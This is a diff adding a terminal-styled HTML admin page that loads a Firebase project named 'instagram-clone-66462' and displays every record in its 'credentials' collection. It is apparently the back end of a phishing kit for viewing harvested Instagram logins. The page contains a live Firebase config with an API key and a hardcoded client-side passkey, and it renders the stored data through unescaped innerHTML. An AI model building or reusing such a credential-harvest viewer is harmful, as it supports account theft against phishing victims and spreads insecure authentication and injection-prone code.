@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMINAL // RAW_DATA_STREAM</title>
+    <style>
+        :root {
+            --bg-color: #050a05;
+            --terminal-green: #00ff66;
+            --terminal-dark-green: #002208;
+            --text-color: #adffd0;
+            --error-red: #ff3333;
+            --border-style: 1px solid var(--terminal-green);
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 10px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin-top: 20px;
+            background: rgba(0, 10, 3, 0.9);
+            border: var(--border-style);
+            padding: 15px;
+            box-shadow: 0 0 20px rgba(0, 255, 102, 0.15);
+        }
+
+        .hidden { display: none !important; }
+
+        /* Gate Access Style */
+        .login-box {
+            max-width: 450px;
+            margin: 60px auto;
+            padding: 20px;
+            border: var(--border-style);
+            background: #000;
+            text-align: center;
+        }
+
+        .terminal-header {
+            color: var(--terminal-green);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            text-shadow: 0 0 5px var(--terminal-green);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background: #000;
+            border: var(--border-style);
+            color: var(--terminal-green);
+            font-size: 1rem;
+            text-align: center;
+        }
+
+        input:focus { outline: none; box-shadow: 0 0 10px var(--terminal-green); }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--terminal-dark-green);
+            color: var(--terminal-green);
+            border: var(--border-style);
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            background-color: var(--terminal-green);
+            color: #000;
+            box-shadow: 0 0 15px var(--terminal-green);
+        }
+
+        /* Control Banner */
+        .banner {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: stretch;
+            gap: 15px;
+            border-bottom: var(--border-style);
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+
+        @media (min-width: 768px) {
+            .banner {
+                flex-direction: row;
+                align-items: center;
+            }
+        }
+
+        .kill-btn {
+            background-color: #220000;
+            color: var(--error-red);
+            border-color: var(--error-red);
+            padding: 8px 20px;
+            width: auto;
+        }
+        .kill-btn:hover {
+            background-color: var(--error-red);
+            color: #000;
+            box-shadow: 0 0 10px var(--error-red);
+        }
+
+        /* Cards Layout for perfect PC & Mobile compatibility */
+        .data-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+        }
+
+        @media (min-width: 768px) {
+            .data-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .data-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        .data-card {
+            background: #000;
+            border: var(--border-style);
+            padding: 15px;
+            border-radius: 2px;
+            overflow-wrap: break-word;
+            word-wrap: break-word;
+        }
+
+        .card-id {
+            font-size: 0.8rem;
+            color: #88ff88;
+            border-bottom: 1px dashed var(--terminal-green);
+            padding-bottom: 5px;
+            margin-bottom: 10px;
+        }
+
+        .data-row {
+            margin: 6px 0;
+            font-size: 0.9rem;
+        }
+
+        .data-key {
+            color: var(--terminal-green);
+            font-weight: bold;
+        }
+
+        .error-msg { 
+            color: var(--error-red); 
+            margin: 10px 0; 
+            text-transform: uppercase;
+            font-size: 0.9rem;
+        }
+
+        .blink { animation: b 1s linear infinite; }
+        @keyframes b { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="login-screen" class="login-box">
+            <div class="terminal-header">// CRYPTO_LOCK KEY_REQUIRED_</div>
+            <div id="login-error" class="error-msg hidden">!! KEY REJECTED !!</div>
+            <input type="password" id="admin-pass" placeholder="ENTER ACCESS PASSKEY..." required>
+            <button id="login-btn">DECRYPT SYSTEM</button>
+        </div>
+
+        <div id="dashboard-screen" class="hidden">
+            <div class="banner">
+                <div class="terminal-header">RAW_DATABASE_INJECTION // STREAMING<span class="blink">_</span></div>
+                <button id="logout-btn" class="kill-btn">CLOSE_STREAM</button>
+            </div>
+
+            <div id="db-error" class="error-msg hidden"></div>
+
+            <div id="data-grid-output" class="data-grid">
+                <div style="color: var(--terminal-green);">[CONNECTING TO FIRESTORE NODE...]</div>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB_8BED9BePH6zcGDjk1oxyDgG6wlzLBTc",
+            authDomain: "instagram-clone-66462.firebaseapp.com",
+            projectId: "instagram-clone-66462",
+            storageBucket: "instagram-clone-66462.firebasestorage.app",
+            messagingSenderId: "850910386904",
+            appId: "1:850910386904:web:8dbfeeebde81585e7b15ad"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const SECRET_PASSKEY = "Admin$Panel";
+
+        const loginScreen = document.getElementById('login-screen');
+        const dashboardScreen = document.getElementById('dashboard-screen');
+        const dataGridOutput = document.getElementById('data-grid-output');
+        const loginError = document.getElementById('login-error');
+        const dbError = document.getElementById('db-error');
+        const passInput = document.getElementById('admin-pass');
+
+        if (sessionStorage.getItem('auth_session') === 'true') {
+            showDashboard();
+        }
+
+        document.getElementById('login-btn').addEventListener('click', () => {
+            if (passInput.value === SECRET_PASSKEY) {
+                loginError.classList.add('hidden');
+                sessionStorage.setItem('auth_session', 'true');
+                showDashboard();
+            } else {
+                loginError.classList.remove('hidden');
+                passInput.value = '';
+            }
+        });
+
+        passInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') document.getElementById('login-btn').click();
+        });
+
+        function showDashboard() {
+            loginScreen.classList.add('hidden');
+            dashboardScreen.classList.remove('hidden');
+            streamAllData();
+        }
+
+        document.getElementById('logout-btn').addEventListener('click', () => {
+            sessionStorage.removeItem('auth_session');
+            location.reload();
+        });
+
+        async function streamAllData() {
+            dbError.classList.add('hidden');
+            dataGridOutput.innerHTML = '';
+            
+            // Fixed to look at your exact collection from the screenshot
+            const TARGET_COLLECTION = "credentials"; 
+
+            try {
+                const querySnapshot = await getDocs(collection(db, TARGET_COLLECTION));
+
+                if (querySnapshot.empty) {
+                    dataGridOutput.innerHTML = `<div style="color: yellow; grid-column: 1/-1;">// WARNING: NO DOCUMENTS FOUND IN "${TARGET_COLLECTION}"</div>`;
+                    return;
+                }
+
+                querySnapshot.forEach((doc) => {
+                    const documentData = doc.data();
+                    
+                    let cardContent = `<div class="data-card">`;
+                    cardContent += `<div class="card-id">DOC_ID: ${doc.id}</div>`;
+                    
+                    for (const [key, value] of Object.entries(documentData)) {
+                        let displayValue = value;
+                        if (typeof value === 'object' && value !== null) {
+                            displayValue = JSON.stringify(value);
+                        }
+                        
+                        cardContent += `
+                            <div class="data-row">
+                                <span class="data-key">${key}:</span> <span>${displayValue}</span>
+                            </div>
+                        `;
+                    }
+
+                    cardContent += `</div>`;
+                    dataGridOutput.innerHTML += cardContent;
+                });
+
+            } catch (error) {
+                console.error(error);
+                dbError.textContent = "!! ACCESS RULES ERROR: " + error.message.toUpperCase() + " !!";
+                dbError.classList.remove('hidden');
+                dataGridOutput.innerHTML = `<div style="color: var(--error-red); grid-column: 1/-1;">CRITICAL EXCEPTION. MAKE SURE YOUR FIRESTORE RULES ARE OPEN FOR READING.</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
